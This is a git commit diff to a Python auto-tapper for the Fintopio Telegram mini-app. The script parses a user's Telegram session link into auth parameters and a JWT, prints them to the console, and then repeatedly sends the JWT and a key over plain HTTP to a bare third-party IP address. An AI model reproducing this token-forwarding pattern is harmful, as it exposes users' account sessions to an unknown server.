5c0b6917e8c1c7bef17b2d40e920cdc6a5bd6d6a
Elphador <96861627+Elphador@users.noreply.github.com>
2024-11-19 12:48:45 -0500

    Update main.py

--- Fintopio/main.py
+++ Fintopio/main.py
@@ -1,11 +1,12 @@
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse, parse_qs,unquote
 import requests
 import os
 import pyfiglet
 from colorama import Fore, Style, init
 from loguru import logger
 import random
-from time import sleep
+from time import sleep 
+
 headers = {
     'accept': 'application/json, text/plain, */*',
     'accept-language': 'en,en-GB;q=0.9,en-US;q=0.8',
@@ -22,28 +23,47 @@ headers = {
     'x-requested-with': 'org.telegram.messenger',
 }
 def genJwt(url):
-    parsed_url = urlparse(url)
-    query_params = parse_qs(parsed_url.fragment)
-    tgWebAppData = parse_qs(query_params.get('tgWebAppData')[0])
-    auth_date = tgWebAppData.get('auth_date', [''])[0]
-    query_id = tgWebAppData.get('query_id', [''])[0]
-    user  = tgWebAppData.get('user', [''])[0]
-    hash = tgWebAppData.get('hash', [''])[0]
-    params = {
-        'query_id': query_id,
-        'user':f'{user}',
-        'auth_date': auth_date,
-        'hash': hash,
-    }
-    response = requests.get('https://fintopio-tg.fintopio.com/api/auth/telegram', params=params, headers=headers)
-    return (response.json())
+    if ('query_id' in url):
+        parsed_url = urlparse(url)
+        query_params = parse_qs(parsed_url.fragment)
+        tgWebAppData = parse_qs(query_params.get('tgWebAppData')[0])
+        auth_date = tgWebAppData.get('auth_date', [''])[0]
+        query_id = tgWebAppData.get('query_id', [''])[0]
+        user  = tgWebAppData.get('user', [''])[0]
+        hash = tgWebAppData.get('hash', [''])[0]
+        params = {
+            'query_id': query_id,
+            'user':f'{user}',
+            'auth_date': auth_date,
+            'hash': hash,
+        }
+        
+        response = requests.get('https://fintopio-tg.fintopio.com/api/auth/telegram', params=params, headers=headers)
+        return (response.json())
+    else:
+        url_query = url.split('#')[1]
+        decoded_query = unquote(url_query)
+        params = parse_qs(decoded_query)
+        params = {
+                'user': params['tgWebAppData'][0].split('=')[-1],
+                'chat_instance': params['chat_instance'][0],
+                'chat_type': 'sender',
+                #'start_param': '-hold_hold-',
+                'auth_date': params['auth_date'][0],
+                'signature': params['signature'][0],
+                'hash': params['hash'][0],
+        }
+        print(params)
+        response = requests.get('https://fintopio-tg.fintopio.com/api/auth/telegram', params=params, headers=headers)
+        print(response.text)
+        return (response.json())
 
 def doCN(jwt,key):
     while True:         
         data = {'jwt':jwt,'key':key}
         response = requests.get('http://77.37.63.209:4000/fin', json=data)
         logger.info(response.json())
-        rest =random.randint(1,20)
+        rest =random.randint(10,20)
         logger.debug(f'[sleeping for : {rest} sec]')
         sleep(rest)
         
@@ -63,19 +83,14 @@ def create_gradient_banner(text):
 
 def print_info_box(social_media_usernames):
     colors = [Fore.CYAN, Fore.MAGENTA, Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTWHITE_EX]
-    
     box_width = max(len(social) + len(username) for social, username in social_media_usernames) + 4
     print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')
-    
     for i, (social, username) in enumerate(social_media_usernames):
         color = colors[i % len(colors)]  # Cycle through colors
         print(color + f'| {social}: {username} |')
-    
     print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')
 
 init(autoreset=True)
-
-    
 if __name__ == '__main__':
     banner_text = "WHYWETAP"
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -87,7 +102,6 @@ if __name__ == '__main__':
         #("", ""),
         ("programmer ", "@demoncratos"),
     ]
-
     print_info_box(social_media_usernames)
     link = input("\nEnter your Fintopio session link : ")
     key = input("\nEnter your Authorization Key : ")
